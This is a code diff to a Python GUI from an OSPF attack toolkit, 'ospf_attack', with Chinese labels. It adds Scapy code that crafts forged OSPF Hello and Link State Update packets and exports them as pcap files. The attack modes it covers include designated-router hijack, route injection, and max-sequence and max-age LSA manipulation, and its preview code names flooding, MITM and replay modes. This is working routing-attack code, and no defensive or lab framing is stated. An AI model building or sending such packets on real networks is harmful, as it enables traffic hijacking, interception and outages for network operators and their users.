@@ -377,6 +377,86 @@ class ConfigForm(tk.Frame):
         """返回当前参数对应的 OSPF 报文预览字符串，供外部预览面板使用。"""
         return _format_ospf_preview(self)
 
+    def build_packet(self):
+        """根据当前参数构造一个 Scapy OSPF 报文（用于导出 pcap）。"""
+        from scapy.all import IP, Raw
+        from scapy.contrib.ospf import OSPF_Hdr, OSPF_Hello, OSPF_LSUpd, OSPF_LSA_Hdr
+        from ospf_attack.network.adapter import get_local_ip
+        from ospf_attack.core.packet import (
+            build_lsa_with_body, build_router_lsa_body, build_external_lsa_body,
+            OSPF_MULTICAST_ALL, OSPF_MULTICAST_DR,
+        )
+
+        w = self._widgets
+        attack = self._attack_name or ""
+        rid = _safe_get(w, "router_id", "1.1.1.1")
+        aid = _safe_get(w, "area_id", "0.0.0.0")
+        iface = _safe_get(w, "iface", "eth0")
+        target = _safe_get(w, "target", "224.0.0.5")
+        src_ip = get_local_ip(iface)
+
+        if attack in ("hello-inject", "adjacency-break", "dr-bdr-hijack"):
+            hi = int(_safe_get(w, "hello_interval", "10"))
+            di = int(_safe_get(w, "router_dead_interval", "40"))
+            pri = int(_safe_get(w, "router_priority", "255"))
+            ip_pkt = IP(src=src_ip, dst=target, proto=89, ttl=1)
+            ospf = OSPF_Hdr(version=2, type=1, src=rid, area=aid)
+            hello = OSPF_Hello(
+                mask=_safe_get(w, "subnet_mask", "255.255.255.0"),
+                hellointerval=hi, prio=pri, deadinterval=di,
+                router="0.0.0.0", backup="0.0.0.0", options=0x02,
+            )
+            return ip_pkt / ospf / hello
+
+        elif attack in ("route-inject", "max-seq", "max-age", "fight-back"):
+            lsa_type = int(_safe_get(w, "lsa_type", "5"))
+            lsid = _safe_get(w, "link_state_id", rid) or rid
+            adv = _safe_get(w, "advertising_router", rid) or rid
+            seq = int(_safe_get(w, "sequence_number", "0x80000001"), 0)
+            age = int(_safe_get(w, "age", "0"))
+            metric = int(_safe_get(w, "metric", "20"))
+            nmask = _safe_get(w, "network_mask", "255.255.255.0")
+            fwd = _safe_get(w, "forwarding_address", "0.0.0.0")
+
+            lsa_data = build_lsa_with_body(
+                lsa_type=lsa_type, link_state_id=lsid,
+                advertising_router=adv, sequence=seq, age=age,
+                metric=metric, network_mask=nmask,
+            )
+            # Construct LSU packet manually to include LSA bytes
+            ip_pkt = IP(src=src_ip, dst=OSPF_MULTICAST_DR, proto=89, ttl=1)
+            ospf = OSPF_Hdr(version=2, type=4, src=rid, area=aid)
+            lsu = OSPF_LSUpd(lsacount=1)
+            return ip_pkt / ospf / lsu / Raw(lsa_data)
+
+        # Fallback: return a minimal hello
+        ip_pkt = IP(src=src_ip, dst=target, proto=89, ttl=1)
+        ospf = OSPF_Hdr(version=2, type=1, src=rid, area=aid)
+        hello = OSPF_Hello(mask="255.255.255.0", hellointerval=10,
+                          prio=1, deadinterval=40, router="0.0.0.0",
+                          backup="0.0.0.0", options=0x02)
+        return ip_pkt / ospf / hello
+
+    def export_pcap(self) -> bool:
+        """将当前构造的报文导出为 pcap 文件，返回是否成功。"""
+        from tkinter import filedialog, messagebox
+        from scapy.utils import wrpcap
+
+        path = filedialog.asksaveasfilename(
+            defaultextension=".pcap",
+            filetypes=[("pcap files", "*.pcap"), ("All files", "*.*")],
+            title="导出报文为 pcap",
+        )
+        if not path:
+            return False
+        try:
+            pkt = self.build_packet()
+            wrpcap(path, pkt)
+            return True
+        except Exception as e:
+            messagebox.showerror("导出失败", str(e))
+            return False
+
     def set_attack(self, attack_name: str):
         """切换攻击类型，重建专属参数区。"""
         self._attack_name = attack_name
@@ -552,6 +632,17 @@ def _open_routes_editor(parent: ttk.Frame, holder: RoutesHolder, count_var: tk.S
     form._auto_fill_link_state_id()
 
 
+def _safe_get(widgets: dict, key: str, default=""):
+    """安全获取 widget 的值。"""
+    v = widgets.get(key)
+    if v is None:
+        return default
+    try:
+        return v.get()
+    except Exception:
+        return str(v) if v else default
+
+
 # ---------------------------------------------------------------------------
 # 报文预览
 # ---------------------------------------------------------------------------
@@ -561,19 +652,10 @@ def _format_ospf_preview(form: "ConfigForm") -> str:
     w = form._widgets
     attack = form._attack_name or ""
 
-    def _get(key, default=""):
-        v = w.get(key)
-        if v is None:
-            return default
-        try:
-            return v.get()
-        except Exception:
-            return str(v) if v else default
-
-    iface = _get("iface", "eth0")
-    target = _get("target", "224.0.0.5")
-    rid = _get("router_id", "1.1.1.1")
-    aid = _get("area_id", "0.0.0.0")
+    iface = _safe_get(w, "iface", "eth0")
+    target = _safe_get(w, "target", "224.0.0.5")
+    rid = _safe_get(w, "router_id", "1.1.1.1")
+    aid = _safe_get(w, "area_id", "0.0.0.0")
 
     # Try to get src IP
     src_ip = "(unknown)"
@@ -596,10 +678,10 @@ def _format_ospf_preview(form: "ConfigForm") -> str:
 
     # Attack-specific body
     if attack in ("hello-inject", "adjacency-break", "dr-bdr-hijack"):
-        hi = _get("hello_interval", "10")
-        di = _get("router_dead_interval", "40")
-        pri = _get("router_priority", "255")
-        mask = _get("subnet_mask", "255.255.255.0")
+        hi = _safe_get(w, "hello_interval", "10")
+        di = _safe_get(w, "router_dead_interval", "40")
+        pri = _safe_get(w, "router_priority", "255")
+        mask = _safe_get(w, "subnet_mask", "255.255.255.0")
         lines.append("├── OSPF Hello ─────────────────────────┤")
         lines.append(f"│ Network Mask : {mask:<22} │")
         lines.append(f"│ Hello Interval: {hi}s   Dead: {di}s         │")
@@ -607,15 +689,15 @@ def _format_ospf_preview(form: "ConfigForm") -> str:
         lines.append(f"│ DR: 0.0.0.0   BDR: 0.0.0.0          │")
 
     elif attack in ("route-inject", "max-seq", "max-age", "fight-back"):
-        lsa_type = _get("lsa_type", "5")
-        lsid = _get("link_state_id", rid)
-        adv = _get("advertising_router", rid)
-        seq = _get("sequence_number", "0x80000001")
-        age = _get("age", "0")
-        metric = _get("metric", "20")
-        nmask = _get("network_mask", "255.255.255.0")
-        fwd = _get("forwarding_address", "0.0.0.0")
-        routes = _get("external_routes")
+        lsa_type = _safe_get(w, "lsa_type", "5")
+        lsid = _safe_get(w, "link_state_id", rid)
+        adv = _safe_get(w, "advertising_router", rid)
+        seq = _safe_get(w, "sequence_number", "0x80000001")
+        age = _safe_get(w, "age", "0")
+        metric = _safe_get(w, "metric", "20")
+        nmask = _safe_get(w, "network_mask", "255.255.255.0")
+        fwd = _safe_get(w, "forwarding_address", "0.0.0.0")
+        routes = _safe_get(w, "external_routes")
         n_routes = len(routes) if isinstance(routes, list) else 0
 
         lsa_name = LSA_TYPE_NAMES.get(str(lsa_type), f"Type-{lsa_type}")
@@ -646,29 +728,29 @@ def _format_ospf_preview(form: "ConfigForm") -> str:
                 lines.append(f"│    Metric: {r_metric}  Fwd: {r_fwd}")
 
     elif attack in ("flood", "spf-recalc", "db-overflow"):
-        dur = _get("duration", "60")
-        rate = _get("packet_rate", "10")
+        dur = _safe_get(w, "duration", "60")
+        rate = _safe_get(w, "packet_rate", "10")
         lines.append("├── DoS 攻击参数 ────────────────────────┤")
         lines.append(f"│ Duration: {dur}s   Rate: {rate} pps        │")
         if attack == "spf-recalc":
-            interval = _get("lsa_change_interval", "2")
+            interval = _safe_get(w, "lsa_change_interval", "2")
             lines.append(f"│ LSA Change Interval: {interval}s              │")
         elif attack == "db-overflow":
-            count = _get("lsa_count", "1000")
+            count = _safe_get(w, "lsa_count", "1000")
             lines.append(f"│ LSA Count: {count:<26} │")
 
     elif attack in ("mitm",):
-        action = _get("action", "modify")
-        ta = _get("target_a", "")
-        tb = _get("target_b", "")
+        action = _safe_get(w, "action", "modify")
+        ta = _safe_get(w, "target_a", "")
+        tb = _safe_get(w, "target_b", "")
         lines.append("├── MITM 参数 ───────────────────────────┤")
         lines.append(f"│ Action: {action:<27} │")
         lines.append(f"│ Target A: {ta:<25} │")
         lines.append(f"│ Target B: {tb:<25} │")
 
     elif attack in ("replay",):
-        cap = _get("capture_file", "")
-        loop = _get("replay_loop", False)
+        cap = _safe_get(w, "capture_file", "")
+        loop = _safe_get(w, "replay_loop", False)
         lines.append("├── Replay 参数 ─────────────────────────┤")
         lines.append(f"│ Capture: {str(cap)[:28]:<28} │")
         lines.append(f"│ Loop: {str(loop):<31} │")
@@ -680,12 +762,14 @@ def _format_ospf_preview(form: "ConfigForm") -> str:
 class PacketPreview(ttk.LabelFrame):
     """报文预览面板 — 显示构造的 OSPF 报文结构。"""
 
-    def __init__(self, parent, preview_fn, **kw):
+    def __init__(self, parent, preview_fn, export_fn=None, **kw):
         super().__init__(parent, text="报文预览", padding=6, **kw)
         self._preview_fn = preview_fn
+        self._export_fn = export_fn
 
         bar = ttk.Frame(self)
         bar.pack(fill=tk.X, pady=(0, 4))
+        ttk.Button(bar, text="导出 pcap", command=self._export).pack(side=tk.LEFT)
         ttk.Button(bar, text="刷新预览", command=self.refresh).pack(side=tk.RIGHT)
 
         self._text = tk.Text(self, font=("Consolas", 9), width=42, height=24,
@@ -696,6 +780,10 @@ class PacketPreview(ttk.LabelFrame):
         self._text.pack(fill=tk.BOTH, expand=True)
 
         self.refresh()
+
+    def _export(self):
+        if self._export_fn:
+            self._export_fn()
 
     def refresh(self):
         try:
